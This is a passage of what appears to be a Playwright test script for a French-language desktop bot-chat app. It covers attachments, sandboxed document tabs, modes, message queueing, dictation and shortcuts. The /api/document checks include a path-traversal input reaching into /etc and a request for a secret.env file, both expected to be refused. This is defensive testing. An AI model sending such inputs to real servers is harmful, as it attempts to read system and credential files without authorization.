  if (!mediaRequests.some((item) => item.path === '/Users/test/cache/upload_envoi.png')) throw new Error('L’image envoyée de l’historique n’est pas chargée.')
  await page.locator('.message-user .cited-files.is-sent').last().scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}sent-image.png` })
  for (let attempt = 0; attempt < 40 && !lastPromptText.includes('@file:attachments/dossier.pdf'); attempt += 1) await delay(50)
  if (fileAttachCalls.length !== 2 || imageAttachCalls.length !== 1) throw new Error(`Pièces jointes : ${fileAttachCalls.length} fichiers, ${imageAttachCalls.length} images.`)
  if (!fileAttachCalls[0].data_url?.startsWith('data:video/mp4;base64,') || fileAttachCalls[0].session_id !== 'chat-orion') throw new Error('file.attach mal formé.')
  if (!lastPromptText.includes('@file:attachments/film.mp4')) throw new Error('La référence du fichier n’est pas dans le prompt.')
  if (await page.locator('.messages-scroll').getByText('@file:').count()) throw new Error('Un @file: brut est visible.')
  await page.getByRole('button', { name: 'Envoyer' }).waitFor({ timeout: 5_000 })

  // Documents: tabs next to the chat. Isolated HTML, rendered Markdown, nothing remote loads.
  await page.locator('.media-document').getByText('rapport.pdf').scrollIntoViewIfNeeded()
  await page.locator('.media-document').getByText('rapport.pdf').click()
  await page.locator('.rail-tab.is-active').getByText('rapport.pdf').waitFor({ timeout: 3_000 })
  await page.locator('.details-panel.has-document iframe[src*="rapport.pdf"]').waitFor({ timeout: 5_000 })
  await page.locator('.media-document').getByText('page.html').click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 3_000 })
  const htmlFrame = page.frameLocator('iframe[sandbox="allow-scripts"]')
  await htmlFrame.getByText('Script local OK').waitFor({ timeout: 5_000 })
  await htmlFrame.locator('body[data-net]').waitFor({ timeout: 5_000 })
  if (await htmlFrame.locator('body').getAttribute('data-cookie') !== 'bloque') throw new Error('La page HTML lit les cookies de l’app.')
  if (await htmlFrame.locator('body').getAttribute('data-net') !== 'bloque') throw new Error('La page HTML a accès au réseau.')
  await page.locator('.media-document').getByText('note.md').click()
  await page.locator('.document-markdown h1').getByText('Note du bot').waitFor({ timeout: 5_000 })
  await page.locator('.document-markdown a[href*="evil.example"]').waitFor({ timeout: 2_000 })
  if (await page.locator('.rail-tab').count() !== 4) throw new Error('Il faut Le bot et trois documents en onglets.')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}document-tabs.png` })
  await page.getByRole('button', { name: 'Fermer note.md' }).click()
  await page.locator('.rail-tab.is-active').getByText('page.html').waitFor({ timeout: 2_000 })
  await page.getByRole('button', { name: 'Fermer page.html' }).click()
  await page.getByRole('button', { name: 'Fermer rapport.pdf' }).click()
  await page.locator('.details-panel.has-document').waitFor({ state: 'detached', timeout: 2_000 })
  if (remoteRequests.length) throw new Error(`Chargement distant : ${remoteRequests[0]}`)

  // /api/document: session required, three formats only, HTML with no origin or network.
  const documentRoute = (file, profile = 'orion') => `http://127.0.0.1:4332/api/document?${new URLSearchParams({ profile, path: file })}`
  if ((await fetch(documentRoute('/Users/test/docs/note.md'))).status !== 401) throw new Error('/api/document sans session.')
  const documentHeaders = await page.evaluate(async (routes) => Promise.all(routes.map(async (route) => {
    const response = await fetch(route, { credentials: 'same-origin' })
    return { status: response.status, type: response.headers.get('content-type'), csp: response.headers.get('content-security-policy'), disposition: response.headers.get('content-disposition') }
  })), ['/Users/test/docs/page.html', '/Users/test/docs/rapport.pdf', '/Users/test/secret.env', '/Users/test/../etc/a.md'].map((file) => documentRoute(file).replace('http://127.0.0.1:4332', '')))
  if (documentHeaders[0].status !== 200 || !documentHeaders[0].csp.startsWith('sandbox allow-scripts;') || documentHeaders[0].csp.includes('allow-same-origin') || !documentHeaders[0].csp.includes("default-src 'none'")) throw new Error(`CSP HTML : ${JSON.stringify(documentHeaders[0])}`)
  if (documentHeaders[0].disposition !== 'inline') throw new Error('Une page HTML doit s’afficher en ligne.')
  if (documentHeaders[1].type !== 'application/pdf' || documentHeaders[1].csp.includes('sandbox')) throw new Error(`PDF : ${JSON.stringify(documentHeaders[1])}`)
  if (documentHeaders[2].status !== 415 || documentHeaders[3].status !== 400) throw new Error(`Filtres /api/document : ${JSON.stringify(documentHeaders.slice(2))}`)

  // Usage tab: session.stats counters, context breakdown, bot history.
  await page.getByRole('tab', { name: 'Usage' }).click()
  await page.locator('.usage-context').getByText('4 %').waitFor({ timeout: 5_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Cache lu' }).first().getByText('90k').waitFor({ timeout: 2_000 })
  await page.locator('.usage-stat').filter({ hasText: 'Appels API' }).first().getByText('14').waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Conversation').waitFor({ timeout: 2_000 })
  await page.locator('.usage-bars i').first().waitFor({ timeout: 2_000 })
  await page.locator('.usage-row').getByText('Opus 5.5').waitFor({ timeout: 2_000 })
  if (!analyticsProfiles.includes('orion')) throw new Error('L’historique n’a pas demandé le profil du bot.')
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}usage-tab.png` })
  await page.getByRole('tab', { name: 'Routines' }).click()

  // Modes: BRAIN and PLAN add an instruction for this turn only, EXEC adds nothing.
  const modeRadio = (name) => page.getByRole('radio', { name, exact: true })
  const sendInMode = async (text) => {
    await orionBox.fill(text)
    await orionBox.press('Enter')
    for (let attempt = 0; attempt < 60 && lastPromptText !== text; attempt += 1) await delay(25)
    if (lastPromptText !== text) throw new Error(`Le texte stocké doit rester celui de l’utilisateur : ${lastPromptText}`)
    await page.locator('.composer-send[aria-label="Envoyer"]').waitFor({ state: 'attached', timeout: 3_000 })
  }
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('EXEC doit être le mode par défaut.')
  await modeRadio('BRAIN').click()
  if (await orionBox.getAttribute('placeholder') !== 'Réfléchir avec Orion') throw new Error('Champ de saisie non adapté au mode.')
  await sendInMode('Test mode brain')
  if (!lastApiText?.startsWith('Test mode brain\n\n[HermesBot mode: BRAIN.') || !lastApiText.includes('Do not change files')) throw new Error(`api_text BRAIN : ${lastApiText}`)
  if (await page.locator('.messages-scroll').getByText('HermesBot mode').count()) throw new Error('La consigne du mode est visible.')
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await modeRadio('EXEC').getAttribute('aria-checked') !== 'true') throw new Error('Le mode doit rester propre à chaque bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await modeRadio('BRAIN').getAttribute('aria-checked') !== 'true') throw new Error('Mode perdu au retour sur le bot.')
  await modeRadio('PLAN').click()
  await sendInMode('Test mode plan')
  if (!lastApiText?.includes('[HermesBot mode: PLAN.')) throw new Error(`api_text PLAN : ${lastApiText}`)
  await modeRadio('EXEC').click()
  await sendInMode('Test mode exec')
  if (lastApiText !== undefined) throw new Error(`EXEC ne doit rien ajouter : ${lastApiText}`)
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}modes.png` })

  // While working: Attendre (default) keeps the draft, File sends it after the turn, Prio interrupts the bot.
  await orionBox.fill('Test pilotage')
  await orionBox.press('Enter')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 3_000 })
  const delivery = (name) => page.getByRole('radiogroup', { name: 'Envoi pendant le travail' }).getByRole('radio', { name, exact: true })
  if (await delivery('Attendre').getAttribute('aria-checked') !== 'true') throw new Error('Attendre doit être le mode par défaut pendant le travail.')
  await orionBox.fill('Fais plutôt la version courte')
  await orionBox.press('Enter')
  await delay(250)
  if (await orionBox.inputValue() !== 'Fais plutôt la version courte') throw new Error('Attendre doit garder le brouillon dans le champ.')
  if (queuedPrompts.length || steerCalls.length || await page.locator('.message-user').getByText('Fais plutôt la version courte').count()) throw new Error('Attendre ne doit rien envoyer.')
  if (await page.getByRole('button', { name: 'Mettre en file' }).count()) throw new Error('Pas de bouton d’envoi en mode Attendre.')
  // The draft survives switching chats and closing the app (local storage).
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  if (await page.getByRole('textbox', { name: 'Message à Nova' }).inputValue()) throw new Error('Le brouillon de Orion est passé chez Nova.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await orionBox.inputValue() !== 'Fais plutôt la version courte') throw new Error('Brouillon perdu au retour sur le bot.')
  if (!(await page.evaluate(() => localStorage.getItem('hermesbot-drafts') || '')).includes('Fais plutôt la version courte')) throw new Error('Le brouillon n’est pas gardé pour la prochaine ouverture.')
  // File: goes out with `queued`, no instruction, and stays visible as "En file".
  await delivery('File').click()
  await orionBox.press('Enter')
  for (let attempt = 0; attempt < 40 && !queuedPrompts.length; attempt += 1) await delay(25)
  if (queuedPrompts[0]?.text !== 'Fais plutôt la version courte' || queuedPrompts[0].apiText !== undefined) throw new Error(`File : ${JSON.stringify(queuedPrompts)}`)
  await page.locator('.message-user').filter({ hasText: 'Fais plutôt la version courte' }).locator('.message-delivery').getByText('En file').waitFor({ timeout: 2_000 })
  if (await orionBox.inputValue()) throw new Error('Le message envoyé reste dans le champ.')
  if (await delivery('Attendre').getAttribute('aria-checked') !== 'true') throw new Error('Après un envoi, retour à Attendre.')
  if ((await page.evaluate(() => localStorage.getItem('hermesbot-drafts') || '')).includes('Fais plutôt la version courte')) throw new Error('Le brouillon envoyé reste stocké.')
  if (interruptCalls.length) throw new Error('File ne doit pas interrompre le bot.')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ timeout: 1_000 })
  // Prio: same queue with a resume instruction, then interrupts the current turn.
  await delivery('Prio').click()
  await orionBox.fill('Et ajoute le tableau')
  await delay(250)
  await page.screenshot({ path: `${SCREENSHOTS}delivery.png` })
  await page.getByRole('button', { name: 'Envoyer en priorité' }).click()
  for (let attempt = 0; attempt < 40 && !interruptCalls.length; attempt += 1) await delay(25)
  if (queuedPrompts[1]?.text !== 'Et ajoute le tableau' || !queuedPrompts[1].apiText?.startsWith('Et ajoute le tableau\n\n[HermesBot priority:')) throw new Error(`Prio : ${JSON.stringify(queuedPrompts[1])}`)
  if (interruptCalls[0]?.session_id !== 'chat-orion' || interruptCalls[0].execution_generation !== 1) throw new Error(`Interruption : ${JSON.stringify(interruptCalls)}`)
  await page.locator('.message-user').filter({ hasText: 'Et ajoute le tableau' }).locator('.message-delivery').getByText('Prioritaire').waitFor({ timeout: 2_000 })
  await page.locator('.message-assistant').getByText('Pilotage terminé.').waitFor({ timeout: 4_000 })
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ state: 'detached', timeout: 3_000 })

  // Dictation (fake desktop bridge): the mic starts it, the pill shows stop + timer + wave, the words land in the field.
  const dictationCalls = (method) => page.evaluate((name) => window.__dictation.calls.filter((call) => call.method === name), method)
  const dictationState = (patch) => page.evaluate((next) => Object.assign(window.__dictation.state, next), patch)
  const dictationEmit = (event) => page.evaluate((payload) => window.__dictation.emit(payload), event)
  const pill = page.getByRole('group', { name: 'Dictée' })
  const sendButton = () => page.locator('.composer-send:not(.is-stop)')
  await dictationState({ finalText: '' })
  await orionBox.fill('Test mode')
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  const prepared = await dictationCalls('prepare')
  const started = await dictationCalls('start')
  if (prepared.length !== 1 || prepared[0].localeId !== 'fr-FR') throw new Error(`Dictée : prepare ${JSON.stringify(prepared)}`)
  if (started.length !== 1 || started[0].localeId !== 'fr-FR' || started[0].onDevice !== true || started[0].listenForMs !== 60_000 || started[0].pauseForMs !== 4_500) throw new Error(`Dictée : start ${JSON.stringify(started)}`)
  if (await page.getByRole('button', { name: 'Dicter', exact: true }).count()) throw new Error('Le micro doit laisser la place à la pastille.')
  await pill.getByRole('button', { name: 'Arrêter la dictée' }).waitFor({ timeout: 1_000 })
  if (await pill.locator('canvas').getAttribute('aria-hidden') !== 'true') throw new Error('L’onde doit être cachée aux lecteurs d’écran.')
  if (!(await orionBox.evaluate((field) => field.readOnly))) throw new Error('Le champ doit être en lecture seule pendant la dictée.')
  const timer = pill.getByRole('timer')
  if (await timer.textContent() !== '0:00') throw new Error('Le minuteur doit partir de 0:00.')
  await page.waitForFunction(() => /^0:0[1-9]$/.test(document.querySelector('.dictation-timer')?.textContent || ''), null, { timeout: 4_000 })
  await dictationEmit({ type: 'words', text: 'dictée', final: false })
  await page.waitForFunction(() => document.querySelector('.composer textarea')?.value === 'Test mode dictée', null, { timeout: 2_000 })
  await dictationEmit({ type: 'words', text: 'dictée en cours', final: false })
  await page.waitForFunction(() => document.querySelector('.composer textarea')?.value === 'Test mode dictée en cours', null, { timeout: 2_000 })
  if (await orionBox.evaluate((field) => field.selectionStart !== field.value.length)) throw new Error('Le curseur doit suivre la transcription.')
  // The wave: tall bars while the level is high, dots at silence.
  const waveHeight = () => page.locator('.dictation-wave').evaluate((canvas) => {
    const { width, height } = canvas
    const data = canvas.getContext('2d').getImageData(0, 0, width, height).data
    let tallest = 0
    for (let x = 0; x < width; x += 1) {
      let count = 0
      for (let y = 0; y < height; y += 1) if (data[(y * width + x) * 4 + 3] > 40) count += 1
      tallest = Math.max(tallest, count)
    }
    return tallest / (height / 20)
  })
  await page.evaluate(() => { window.__dictationLevels = setInterval(() => window.__dictation.emit({ type: 'level', value: 1 }), 30) })
  await page.waitForFunction(() => document.querySelector('.dictation-wave')?.getContext('2d').getImageData(0, 0, 200, 40).data.some((value, index) => index % 4 === 3 && value > 40), null, { timeout: 2_000 })
  await delay(500)
  const loud = await waveHeight()
  if (loud < 14) throw new Error(`L’onde doit monter avec le niveau : ${loud}`)
  await page.evaluate(() => { clearInterval(window.__dictationLevels); window.__dictation.emit({ type: 'level', value: 0.55 }); window.__dictationLevels = setInterval(() => window.__dictation.emit({ type: 'level', value: 0.3 + Math.random() * 0.6 }), 70) })
  await delay(900)
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark' })
  await delay(150)
  await page.locator('.composer-wrap').screenshot({ path: `${SCREENSHOTS}composer-dictation.png` })
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await delay(150)
  await page.locator('.composer-wrap').screenshot({ path: `${SCREENSHOTS}composer-dictation-light.png` })
  await page.evaluate(() => { clearInterval(window.__dictationLevels); window.__dictationLevels = setInterval(() => window.__dictation.emit({ type: 'level', value: 0 }), 30) })
  await delay(1_200)
  const quiet = await waveHeight()
  if (quiet > 4.5) throw new Error(`L’onde doit retomber en points au silence : ${quiet}`)
  await page.evaluate(() => clearInterval(window.__dictationLevels))
  // Reduced motion (system or the app's own setting): the wave keeps a fixed shape, its height follows the level in steps.
  await page.emulateMedia({ reducedMotion: 'reduce' })
  await page.evaluate(() => window.__dictation.emit({ type: 'level', value: 1 }))
  await delay(300)
  const stillFull = await waveHeight()
  await page.evaluate(() => window.__dictation.emit({ type: 'level', value: 0 }))
  await delay(300)
  const stillQuiet = await waveHeight()
  await page.emulateMedia({ reducedMotion: 'no-preference' })
  if (stillFull < 14 || stillQuiet > 4.5) throw new Error(`Animations réduites : onde ${stillFull} puis ${stillQuiet}`)
  // Stop: the final words land, the pill goes, the text stays and can be edited.
  await dictationState({ finalText: 'dictée en cours terminée' })
  await pill.getByRole('button', { name: 'Arrêter la dictée' }).click()
  await pill.waitFor({ state: 'detached', timeout: 3_000 })
  if ((await dictationCalls('stop')).length !== 1) throw new Error('Stop doit arrêter la dictée une seule fois.')
  if (await orionBox.inputValue() !== 'Test mode dictée en cours terminée') throw new Error(`Le texte dicté doit rester : ${await orionBox.inputValue()}`)
  // The field gets its focus and caret back in an effect, a moment after the pill leaves: wait for it.
  const editable = await page.waitForFunction((field) => !field.readOnly && document.activeElement === field && field.selectionStart === field.value.length, await orionBox.elementHandle(), { timeout: 3_000 }).then(() => true, () => false)
  if (!editable) throw new Error(`Après Stop : champ modifiable, focus et curseur à la fin (${JSON.stringify(await orionBox.evaluate((field) => ({ readOnly: field.readOnly, focused: document.activeElement === field, caret: field.selectionStart, length: field.value.length })))}).`)
  await page.keyboard.type(' !')
  if (await orionBox.inputValue() !== 'Test mode dictée en cours terminée !') throw new Error('Le texte doit pouvoir être retouché après la dictée.')
  // Send while dictating: the dictation stops, the field goes out once, with the final words.
  const promptsBeforeDictation = promptCalls
  await orionBox.fill('Test mode')
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  await dictationEmit({ type: 'words', text: 'envoyée', final: false })
  await page.waitForFunction(() => document.querySelector('.composer textarea')?.value === 'Test mode envoyée', null, { timeout: 2_000 })
  await dictationState({ finalText: 'envoyée tout de suite' })
  await sendButton().click()
  for (let attempt = 0; attempt < 60 && promptCalls === promptsBeforeDictation; attempt += 1) await delay(25)
  await delay(700)
  if (promptCalls !== promptsBeforeDictation + 1) throw new Error(`Envoyer pendant la dictée : ${promptCalls - promptsBeforeDictation} message(s).`)
  if (lastPromptText !== 'Test mode envoyée tout de suite') throw new Error(`Envoyer pendant la dictée : ${lastPromptText}`)
  if ((await dictationCalls('stop')).length !== 2) throw new Error('Envoyer doit arrêter la dictée.')
  if (await pill.count() || await orionBox.inputValue()) throw new Error('Après l’envoi, plus de pastille et un champ vide.')
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ state: 'detached', timeout: 4_000 })
  // The send key does the same.
  await orionBox.fill('Test mode')
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  await dictationEmit({ type: 'words', text: 'au clavier', final: false })
  await page.waitForFunction(() => document.querySelector('.composer textarea')?.value === 'Test mode au clavier', null, { timeout: 2_000 })
  await dictationState({ finalText: 'au clavier aussi' })
  await orionBox.press('Enter')
  for (let attempt = 0; attempt < 60 && promptCalls === promptsBeforeDictation + 1; attempt += 1) await delay(25)
  await delay(700)
  if (promptCalls !== promptsBeforeDictation + 2 || lastPromptText !== 'Test mode au clavier aussi') throw new Error(`Entrée pendant la dictée : ${promptCalls - promptsBeforeDictation} message(s), « ${lastPromptText} ».`)
  await page.getByRole('button', { name: 'Arrêter le bot' }).waitFor({ state: 'detached', timeout: 4_000 })
  // Escape stops it, the text stays.
  await dictationState({ finalText: '' })
  await orionBox.fill('Brouillon')
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  await dictationEmit({ type: 'words', text: 'et la suite', final: false })
  await page.waitForFunction(() => document.querySelector('.composer textarea')?.value === 'Brouillon et la suite', null, { timeout: 2_000 })
  const stopsBeforeEscape = (await dictationCalls('stop')).length
  await page.keyboard.press('Escape')
  await pill.waitFor({ state: 'detached', timeout: 3_000 })
  if ((await dictationCalls('stop')).length !== stopsBeforeEscape + 1 || await orionBox.inputValue() !== 'Brouillon et la suite') throw new Error('Échap doit arrêter la dictée en gardant le texte.')
  // Another bot: the dictation ends there, nothing it hears reaches the other field.
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  const cancelsBeforeSwitch = (await dictationCalls('cancel')).length
  await page.locator('[data-bot=nova]').click()
  await page.locator('[data-bot=nova].is-selected').waitFor()
  await pill.waitFor({ state: 'detached', timeout: 3_000 })
  await dictationEmit({ type: 'words', text: 'fantôme', final: false })
  await delay(300)
  if ((await dictationCalls('cancel')).length !== cancelsBeforeSwitch + 1) throw new Error('Changer de bot doit rendre le micro.')
  if (await page.getByRole('textbox', { name: 'Message à Nova' }).inputValue()) throw new Error('La dictée a écrit dans le champ d’un autre bot.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await orionBox.inputValue() !== 'Brouillon et la suite') throw new Error(`Le brouillon d’Orion doit rester : ${await orionBox.inputValue()}`)
  await orionBox.fill('')
  // Refused access: a notice that says where to allow it, a mic that looks disabled and repeats the reason.
  await dictationState({ access: 'denied' })
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  const toast = page.locator('.toast')
  await toast.getByText('Réglages Système', { exact: false }).waitFor({ timeout: 3_000 })
  if (!(await toast.textContent()).includes('Microphone') || !(await toast.textContent()).includes('Reconnaissance vocale')) throw new Error('Le message doit dire où autoriser le micro et la reconnaissance vocale.')
  const blockedMic = page.getByRole('button', { name: 'Dictée indisponible' })
  await blockedMic.waitFor({ timeout: 2_000 })
  if (await blockedMic.getAttribute('aria-disabled') !== 'true' || !(await blockedMic.getAttribute('class')).includes('is-blocked')) throw new Error('Le micro bloqué doit avoir l’air désactivé.')
  await toast.getByRole('button', { name: 'Fermer' }).click()
  await toast.waitFor({ state: 'detached', timeout: 2_000 })
  const preparedBefore = (await dictationCalls('prepare')).length
  // aria-disabled only: Playwright treats it as disabled, a real click still goes through.
  await blockedMic.click({ force: true })
  await toast.getByText('Réglages Système', { exact: false }).waitFor({ timeout: 2_000 })
  if ((await dictationCalls('prepare')).length !== preparedBefore) throw new Error('Un micro bloqué ne doit pas redemander l’accès au système.')
  // Back in the window after allowing it in System Settings: the next click tries again.
  await dictationState({ access: 'granted' })
  await page.evaluate(() => window.dispatchEvent(new Event('focus')))
  await page.getByRole('button', { name: 'Dicter', exact: true }).waitFor({ timeout: 2_000 })
  await toast.getByRole('button', { name: 'Fermer' }).click()
  // No microphone, language missing, offline: each has its own notice.
  const cases = [
    [{ microphone: true, exists: true, onDevice: false, available: false }, 'Pas de connexion'],
    [{ microphone: false, exists: true, onDevice: true, available: true }, 'Aucun micro'],
    [{ microphone: true, exists: false, onDevice: true, available: true }, 'ne sait pas encore reconnaître'],
  ]
  for (const [patch, text] of cases) {
    await dictationState(patch)
    await page.getByRole('button', { name: /^Dict/ }).click({ force: true })
    await toast.getByText(text, { exact: false }).waitFor({ timeout: 3_000 })
    await toast.getByRole('button', { name: 'Fermer' }).click()
    await toast.waitFor({ state: 'detached', timeout: 2_000 })
    await page.evaluate(() => window.dispatchEvent(new Event('focus')))
  }
  // The language stays blocked until the next launch (it does not come back by itself): the mic says so.
  await page.getByRole('button', { name: 'Dictée indisponible' }).waitFor({ timeout: 2_000 })
  // Another dictation language (Settings > Conversations), here one this Mac knows: the mic comes back and listens in it.
  await dictationState({ exists: true })
  const dictationSettings = page.getByRole('dialog', { name: 'Réglages' })
  const chooseDictationLanguage = async (name) => {
    await page.getByRole('button', { name: 'Réglages', exact: true }).click()
    await dictationSettings.getByRole('button', { name: 'Conversations' }).click()
    await dictationSettings.getByRole('radiogroup', { name: 'Langue de la dictée' }).getByRole('radio', { name }).click()
    await dictationSettings.getByRole('button', { name: 'Fermer les réglages' }).click()
    await dictationSettings.waitFor({ state: 'detached', timeout: 3_000 })
  }
  await chooseDictationLanguage('English')
  await page.getByRole('button', { name: 'Dicter', exact: true }).click()
  await pill.waitFor({ timeout: 3_000 })
  const englishPrepare = (await dictationCalls('prepare')).at(-1)
  const englishStart = (await dictationCalls('start')).at(-1)
  if (englishPrepare?.localeId !== 'en-US' || englishStart?.localeId !== 'en-US') throw new Error(`Dictée en anglais sous une interface en français : ${JSON.stringify({ englishPrepare, englishStart })}`)
  await page.keyboard.press('Escape')
  await pill.waitFor({ state: 'detached', timeout: 3_000 })
  await chooseDictationLanguage('Interface')
  if ((await page.evaluate(() => JSON.parse(localStorage.getItem('hermesbot-settings')))).dictationLanguage !== 'interface') throw new Error('La langue de la dictée doit revenir à celle de l’interface.')

  // Send button: black and white, flat, in both themes (the disc has the text colour, the arrow the background colour).
  await orionBox.fill('Un message')
  for (const theme of ['light', 'dark']) {
    await page.evaluate((value) => { document.documentElement.dataset.theme = value }, theme)
    // Its colours move with a transition (theme, enabled): read them once it is over, even on a slow machine.
    await sendButton().evaluate((button) => Promise.all(button.getAnimations().map((animation) => animation.finished.catch(() => {}))))
    await delay(50)
    const look = await sendButton().evaluate((button) => {
      const style = getComputedStyle(button)
      return { background: style.backgroundColor, color: style.color, image: style.backgroundImage, shadow: style.boxShadow, text: getComputedStyle(document.querySelector('.composer textarea')).color, page: getComputedStyle(document.body).backgroundColor }
    })
    if (look.background !== look.text || look.image !== 'none' || look.shadow !== 'none') throw new Error(`Bouton Envoyer (${theme}) : ${JSON.stringify(look)}`)
    await page.locator('.composer-wrap').screenshot({ path: `${SCREENSHOTS}composer-send${theme === 'dark' ? '-dark' : ''}.png` })
  }
  await page.evaluate(() => { document.documentElement.dataset.theme = 'light' })
  await orionBox.fill('')
  const disabledSend = await sendButton().evaluate((button) => ({ disabled: button.disabled, background: getComputedStyle(button).backgroundColor, text: getComputedStyle(document.querySelector('.composer textarea')).color }))
  if (!disabledSend.disabled || disabledSend.background === disabledSend.text) throw new Error(`Envoyer vide doit avoir l’air désactivé : ${JSON.stringify(disabledSend)}`)
  // Stop the turn: the pause of a music player (two bars, filled), same disc, and it still stops the turn.
  const interruptsBeforeStop = interruptCalls.length
  const assistantRepliesBeforeStop = await page.locator('.message-assistant').count()
  await orionBox.fill('Test pilotage')
  await orionBox.press('Enter')
  const stopTurn = page.getByRole('button', { name: 'Arrêter le bot' })
  await stopTurn.waitFor({ timeout: 3_000 })
  const pauseLook = await stopTurn.evaluate((button) => {
    const style = getComputedStyle(button)
    const icon = button.querySelector('svg')
    return { bars: icon?.querySelectorAll('rect').length, pause: icon?.classList.contains('lucide-pause'), fill: icon ? getComputedStyle(icon.querySelector('rect')).fill : null, background: style.backgroundColor, text: getComputedStyle(document.querySelector('.composer textarea')).color, image: style.backgroundImage }
  })
  if (pauseLook.bars !== 2 || !pauseLook.pause || pauseLook.background !== pauseLook.text || pauseLook.image !== 'none' || pauseLook.fill === 'none') throw new Error(`Bouton pause : ${JSON.stringify(pauseLook)}`)
  await page.locator('.composer-wrap').screenshot({ path: `${SCREENSHOTS}composer-pause.png` })
  await stopTurn.click()
  for (let attempt = 0; attempt < 40 && interruptCalls.length === interruptsBeforeStop; attempt += 1) await delay(25)
  if (interruptCalls.length !== interruptsBeforeStop + 1) throw new Error('Le bouton pause doit toujours arrêter le tour.')
  // The simulated gateway then runs the queued turn of the earlier step: wait for its reply, not just for the pause to go.
  await page.waitForFunction((before) => document.querySelectorAll('.message-assistant').length > before && !document.querySelector('.composer-send.is-stop'), assistantRepliesBeforeStop, { timeout: 5_000 })
  await delay(300)
  await stopTurn.waitFor({ state: 'detached', timeout: 3_000 })

  // Bot question mid-turn (clarify tool): card above the field, "Attend ta réponse" everywhere.
  liveStatusByProfile.orion = 'waiting'
  await orionBox.fill('Test question')
  await orionBox.press('Enter')
  const promptCard = page.locator('.prompt-card')
  await promptCard.getByText('Pour quel post ?').waitFor({ timeout: 3_000 })
  await page.locator('.chat-status').getByText('Attend ta réponse').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=orion] .bot-row-status').getByText('Attend ta réponse').waitFor({ timeout: 8_000 })
  await delay(300)
  await page.screenshot({ path: `${SCREENSHOTS}question.png` })
  await promptCard.getByRole('button', { name: 'Post B', exact: true }).click()
  await promptCard.getByText('Que doit montrer l’image ?').waitFor({ timeout: 3_000 })
  await promptCard.getByRole('button', { name: 'Personnage', exact: true }).click()
  await promptCard.getByRole('button', { name: 'Décor', exact: true }).click()
  await promptCard.getByRole('button', { name: 'Valider (2)' }).click()
  await promptCard.getByText('Une remarque ?').waitFor({ timeout: 3_000 })
  await promptCard.getByRole('textbox').fill('Fond clair')
  await promptCard.getByRole('textbox').press('Enter')
  await page.locator('.message-assistant').getByText('Images prêtes.').waitFor({ timeout: 4_000 })
  await promptCard.waitFor({ state: 'detached', timeout: 2_000 })
  delete liveStatusByProfile.orion
  const sentAnswers = promptAnswers.map(({ method, profile, session_id, execution_generation, prompt_id, answer }) => [method, profile, session_id, execution_generation, prompt_id, answer].join('|'))
  if (JSON.stringify(sentAnswers) !== JSON.stringify([
    'clarify.respond|orion|chat-orion|1|q1|Post B',
    'clarify.respond|orion|chat-orion|1|q2|["Personnage","Décor"]',
    'clarify.respond|orion|chat-orion|1|q3|Fond clair',
  ])) throw new Error(`Réponses aux questions : ${JSON.stringify(sentAnswers)}`)
  // A question left open comes back when the session resumes.
  resumePrompts['chat-nova'] = [{ kind: 'clarify', prompt_id: 'q-reprise', execution_generation: 1, question: 'On continue ?', choices: ['Oui', 'Non'], multi_select: false }]
  await page.locator('[data-bot=nova]').click()
  await promptCard.getByText('On continue ?').waitFor({ timeout: 5_000 })
  delete resumePrompts['chat-nova']
  await promptCard.getByRole('button', { name: 'Oui', exact: true }).click()
  await page.locator('.message-assistant').getByText('Reprise terminée.').waitFor({ timeout: 4_000 })
  await promptCard.waitFor({ state: 'detached', timeout: 2_000 })
  if (promptAnswers.at(-1)?.prompt_id !== 'q-reprise' || promptAnswers.at(-1)?.answer !== 'Oui') throw new Error('Réponse à la question reprise incorrecte.')
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // Shortcuts: palette ⌘K, next bot Alt+↓, quote ⌘L, search ⌘F.
  await page.keyboard.press('Meta+k')
  await page.getByRole('textbox', { name: 'Chercher un bot' }).fill('nov')
  await page.locator('.palette-results').getByText('Nova', { exact: true }).waitFor({ timeout: 2_000 })
  await page.keyboard.press('Enter')
  await page.locator('[data-bot=nova].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.palette').waitFor({ state: 'detached', timeout: 2_000 })
  await page.keyboard.press('Alt+ArrowDown')
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })
  await page.locator('.message-assistant').getByText('Pilotage terminé.').last().evaluate((node) => { const range = document.createRange(); range.selectNodeContents(node); const selection = window.getSelection(); selection.removeAllRanges(); selection.addRange(range) })
  await page.keyboard.press('Meta+l')
  if (await orionBox.inputValue() !== '> Pilotage terminé.\n\n') throw new Error(`Citation ⌘L : ${await orionBox.inputValue()}`)
